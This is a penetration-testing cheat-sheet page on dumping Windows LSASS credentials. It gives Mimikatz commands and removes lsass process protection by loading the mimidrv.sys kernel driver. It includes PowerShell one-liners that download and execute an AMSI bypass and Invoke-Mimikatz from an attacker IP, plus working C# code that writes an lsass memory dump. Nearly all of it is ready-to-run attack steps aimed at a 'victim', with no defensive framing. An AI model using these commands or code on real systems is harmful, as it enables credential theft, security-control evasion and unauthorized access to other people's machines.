---
title: Local Security Authority (LSA)
layout: default
parent: Windows Credentials
nav_order: 4
---

## Mimikatz ##

1\. Run the following:\
`mimikatz.exe`

2\. Activate debug privilege:\
`privilege::debug`

3\. Get the hash:\
`sekurlsa::logonpasswords`

4\. If you see the error "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)", copy mimidrv.sys over and run:\
`!+`

5\. Remove protection for lsass.exe (need mimidrv.sys):\
`!processprotect /process:lsass.exe /remove`

6\. Then can try again:\
`sekurlsa::logonpasswords`

## Invoke Mimikatz and mimidrv.sys ##

1\. Make sure mimidrv.sys is in the victim, then\
`sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand`\
`sc start mimidrv`

2\. Powershell:
`powershell`

3\. AMSI bypass:\
`(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/amsi.txt') | IEX`

4\. Invoke mimikatz:\
`(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/mimikatz.txt') | IEX`

5\. Remove protection:\
``Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""``

## GUI Dump (Task Manager) ##

1\. Right click on lsass.exe in Task Manager, then select Create Dump File.

2\. Copy it to a computer with mimikatz.exe (must be same architecture and OS) and parse it using:\
`sekurlsa::minidump lsass.dmp`

3\. Then can read the hash:\
`sekurlsa::logonpasswords`

## Program Dump (C# Code) ##

1\. Create the following MiniDump.exe
```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
          IntPtr hFile, int DumpType, IntPtr ExceptionParam,
          IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
         int processId);

        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);

            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
```

2\. Run this as admin/SYSTEM and a dump will be created at C:\Windows\tasks\lsass.dmp. Then copy it to a computer with mimikatz.exe (must be same architecture and OS) and parse it using:\
`sekurlsa::minidump lsass.dmp`

3\. Then can read the hash:\
`sekurlsa::logonpasswords`

Alternatively can try this powershell script:
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1